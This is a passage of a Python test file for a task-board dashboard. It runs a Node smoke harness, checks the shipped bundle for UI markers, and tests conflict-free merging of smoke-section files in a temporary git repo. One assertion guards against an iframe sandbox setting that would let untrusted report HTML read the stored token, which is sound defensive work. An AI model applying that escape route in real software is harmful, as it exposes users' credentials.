        "card": dev.call("card", {"task": cards[1]["id"]}),
        "closed": a_closed_pair(root.parent / "closed"),
        # The board this credential is looking at owes it an answer, and the
        # page must say so — a mention row carries what was said, not a title.
        "expect_board": ["Addressed to you", "Decimal or float?"],
        # Everything the dossier promises to show. A missing section fails here.
        "expect": [
            "the reduced rate",
            "10% for food",  # the spec
            "Criteria · 2",  # the section, counted
            "Decimal, never float",  # the criterion itself
            "got to the rounding",  # the previous worker's note
            "VAT",  # the epic, resolved
            "a3f9c21b",  # the commit, with its subject
        ],
        # The /git door's own answers over a real clone — a range, one committed
        # report's bytes, and its own refusals (no clone here, a ref this clone
        # lacks, a path that is not a report). ARCHITECTURE.md §16.
        "git": answers,
    }
    dev.close()
    worker.close()
    return fixture


@needs_node
@pytest.mark.usefixtures("clock")
def test_the_pages_draw_the_board_and_the_dossier(tmp_path: Path) -> None:
    path = tmp_path / "fixture.json"
    path.write_text(json.dumps(a_board(tmp_path / "board")), encoding="utf-8")

    done = subprocess.run(
        ["node", str(HARNESS), str(path)],
        cwd=UI,
        capture_output=True,
        text=True,
        timeout=180,
        check=False,
    )
    assert done.returncode == 0, f"{done.stdout}\n{done.stderr}"
    assert "smoke ok" in done.stdout
    # The harness prints one `ok <claim>` per assertion; naming a few here means
    # a harness that silently stopped asserting them still fails this test.
    for claim in (
        "ok criteria are on screen",
        "ok the draft survives a refusal",
        # The eighth wave's own claim, named here for the same reason as the two
        # above: a harness that silently stopped asserting it still fails.
        "ok a close draws its transition AND the note the worker signed off with",
        "ok a close with no commit says so, in the Python renderer's own words",
    ):
        assert claim in done.stdout, done.stdout
    for pane in PANES:
        assert f"ok pane {pane}" in done.stdout, done.stdout


def test_the_committed_bundle_carries_the_dashboard() -> None:
    """What `pip install taskops` actually serves.

    Not a substitute for the harness above — it reads bytes, it does not run
    them — but it is the only assertion that is about the SHIPPED artefact, and
    a minifier keeps string literals, so a pane that lost its `data-testid` or a
    bundle rebuilt from a tree without a panel fails here.
    """
    page = (BUNDLE / "index.html").read_text(encoding="utf-8")
    assert "app.js" in page and "style.css" in page
    assert (BUNDLE / "style.css").read_text(encoding="utf-8").strip()

    app = (BUNDLE / "app.js").read_text(encoding="utf-8")
    for pane in PANES:
        assert f'"{pane}"' in app, f"{pane} is not in the committed bundle"
    for testid in ("monitor", "board", "criteria", "comment-box"):
        assert f'"{testid}"' in app, f"{testid} is not in the committed bundle"
    markers = (
        VIEWS + GITHUB_VISIBLE + OWN_CLONE + WORKTREES_PR + SIDE_BY_SIDE + NOTHING_DRAWN
    ) + CHAPTERS_LISTED + CLOSING_NOTE + ACTORS + DATE_PANES + PROSE + REPORTS + FORGE_SAID + TREE_INWARD
    for testid in markers:
        assert f'"{testid}"' in app, f"{testid} is not in the committed bundle — rebuild it"
    for testid in RETIRED + RETIRED_TIMESHEET:
        assert f'"{testid}"' not in app, f"{testid} was retired but is still in the bundle"
    # A sentence, not a `data-testid`, so it is read as a plain substring: the
    # minifier keeps the literal but not the quotes around a JSX text node.
    for phrase in RETIRED_APOLOGY:
        assert phrase not in app, f"{phrase!r} was retired but is still in the bundle"
    # The pane that used to say "no events verb" no longer can: the verb exists
    # (`verbs/events.py`), so an empty pane now means an empty LOG and says that.
    assert "no events verb" not in app
    assert "The log is empty." in app
    # The anchor host, verbatim in the bytes — without it no link renders at all.
    assert "github.com" in app
    # The reports chapter's FOURTH acceptance criterion, in one line and against
    # the SHIPPED bytes: a report is untrusted HTML and this origin holds the
    # token, so the frame is `allow-scripts` and the pair `allow-scripts` +
    # `allow-same-origin` — which lets the frame read `parent.localStorage` and
    # strip its own sandbox attribute — must not exist anywhere in the bundle.
    # `ui/smoke/sections/report-sandbox.tsx` pins the same rule on the RENDERED
    # markup; this is what would notice a rebuild from a tree where it was
    # widened, which no render of a well-behaved fixture ever could.
    assert "allow-scripts" in app and "allow-same-origin" not in app


SECTIONS = UI / "smoke" / "sections"
GENERATOR = UI / "smoke" / "sections.mjs"

#: A section, as a card in a wave writes one: a file of its own, named after what
#: it pins. The BODY is irrelevant to the property under test — what is tested is
#: that two cards adding one each never touch a shared line.
A_SECTION = """import type {{ Check, Fixture, Harness }} from "./section";

export async function run(_fixture: Fixture, check: Check, _h: Harness): Promise<void> {{
  check("{slug}", true);
}}
"""

needs_git = pytest.mark.skipif(shutil.which("git") is None, reason="needs git")


def _git(repo: Path, *args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args], cwd=repo, capture_output=True, text=True, check=False
    )


@needs_node
@needs_git
def test_two_cards_adding_a_smoke_section_in_parallel_do_not_conflict(tmp_path: Path) -> None:
    """The property the whole `sections/` shape was bought for.

    The appendix it replaced (`ui/smoke/main.tsx`, ~2.300 lines, appended to by
    every UI card) made this case conflict BY CONSTRUCTION: tk-a1b7f2 × tk-63f919
    produced a 293-line conflict block, and the same merge auto-STACKED two
    `const reviewed` declarations in one scope — a "clean" merge that only tsc
    caught. Both are impossible here, and if a future refactor quietly brings the
    appendix back this is the test that says so.
    """
    repo = tmp_path / "repo"
    (repo / "sections").mkdir(parents=True)
    for real in sorted(SECTIONS.glob("*.ts*")):
        if real.name != "index.generated.ts":
            shutil.copy(real, repo / "sections" / real.name)
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "t@t")
    _git(repo, "config", "user.name", "t")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "the sections as they stand")
    trunk = _git(repo, "rev-parse", "--abbrev-ref", "HEAD").stdout.strip()

    for card in ("tk-aaa111-pane", "tk-bbb222-rail"):
        _git(repo, "checkout", "-q", "-b", card, trunk)
        (repo / "sections" / f"{card}.tsx").write_text(
            A_SECTION.format(slug=card), encoding="utf-8"
        )
        _git(repo, "add", "-A")
        _git(repo, "commit", "-qm", f"{card}: one section file, nothing else")

    _git(repo, "checkout", "-q", trunk)
    for card in ("tk-aaa111-pane", "tk-bbb222-rail"):
        merged = _git(repo, "merge", "--no-edit", card)
        assert merged.returncode == 0, merged.stdout + merged.stderr
    # git's own word for "a path is conflicted", not a guess from the exit code.
    assert _git(repo, "ls-files", "-u").stdout == ""

    generated = subprocess.run(
        ["node", str(GENERATOR), str(repo / "sections")],
        capture_output=True,
        text=True,
        check=False,
    )
    assert generated.returncode == 0, generated.stderr
    index = (repo / "sections" / "index.generated.ts").read_text(encoding="utf-8")
    for card in ("tk-aaa111-pane", "tk-bbb222-rail"):
        assert f'"{card}"' in index, index
    # Deterministic: filename order, so no section "goes first" by merge accident.
    slugs = [line.split('"')[1] for line in index.splitlines() if line.startswith('  [')]
    assert slugs == sorted(slugs), slugs
    assert len(slugs) == len(list(SECTIONS.glob("*.tsx"))) + 2


@needs_node
def test_the_run_order_is_the_filename_order_whatever_the_filesystem_says() -> None:
    """`order()` is pure and separate from the `readdir` for this reason: APFS
    hands names back sorted and ext4 hands them back in hash order, so a test
    that reads a real directory pins the filesystem, not the rule. Mutation-checked:
    dropping `.sort()` is invisible against a directory here and red against this."""
    said = subprocess.run(
        [
            "node",
            "--input-type=module",
            "-e",
            f"const m = await import({str(GENERATOR)!r});"
            ' console.log(JSON.stringify(m.order(["z.tsx", "a.tsx", "index.generated.ts",'
            ' "section.ts", "m.ts", "notes.md"])));',
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    assert said.returncode == 0, said.stderr
    assert json.loads(said.stdout) == ["a.tsx", "m.ts", "z.tsx"], said.stdout


@needs_node
def test_two_section_files_claiming_one_slug_are_refused_loudly(tmp_path: Path) -> None:
    """One name, one section — the §9 bug (two workers, one number) reborn as an
    extension collision, which is the case the filesystem does NOT catch."""
    where = tmp_path / "sections"
    where.mkdir()
    shutil.copy(SECTIONS / "section.ts", where / "section.ts")
    (where / "swarm.tsx").write_text(A_SECTION.format(slug="swarm"), encoding="utf-8")
    (where / "swarm.ts").write_text(A_SECTION.format(slug="swarm"), encoding="utf-8")

    refused = subprocess.run(
        ["node", str(GENERATOR), str(where)], capture_output=True, text=True, check=False
    )
    assert refused.returncode != 0
    assert 'two files claim the slug "swarm"' in refused.stderr, refused.stderr
    assert not (where / "index.generated.ts").exists()


@needs_git
def test_the_generated_section_index_is_never_committed() -> None:
    """It is written by `sections.mjs` on every build and gitignored: a generated
    list cannot conflict, and a hand-edited one IS the appendix."""
    ignored = subprocess.run(
        ["git", "check-ignore", "ui/smoke/sections/index.generated.ts"],
        cwd=ROOT,
        capture_output=True,
        text=True,
        check=False,
    )
    assert ignored.returncode == 0, "the generated index must be gitignored"
    tracked = subprocess.run(
        ["git", "ls-files", "ui/smoke/sections/index.generated.ts"],
        cwd=ROOT,
        capture_output=True,
        text=True,
        check=False,
    )
    assert tracked.stdout == "", "the generated index is committed — it must not be"


_ = T0, _clock


#: The card modal's Worktree block sends the reader INWARDS now — to the
#: worktree view in this dashboard, reading this clone — instead of out to a
#: forge compare of two branches (`card-compare`, retired above). It is a marker
#: of its own and not a line in GITHUB_VISIBLE, because the whole point is that
#: it needs no slug: a board with no forge at all still has worktrees.
TREE_INWARD = ("card-open-tree",)
